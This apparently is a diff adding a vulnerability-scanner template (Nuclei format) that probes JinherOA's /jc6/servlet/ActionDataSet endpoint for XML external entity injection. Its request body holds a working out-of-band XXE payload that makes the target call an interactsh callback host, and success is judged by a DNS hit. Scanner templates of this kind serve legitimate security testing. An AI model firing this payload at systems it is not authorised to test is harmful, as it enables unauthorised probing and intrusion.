@@ -1,0 +1,33 @@
+id: poc-yaml-jinher-actiondataset-xxe
+info:
+  name: JinherOA ActionDataSet XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,xxe
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - method: POST
+    path:
+      - "/jc6/servlet/ActionDataSet"
+    headers:
+      Content-Type: application/xml
+    body: |-
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://{{reverse}}"> %remote;]>
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
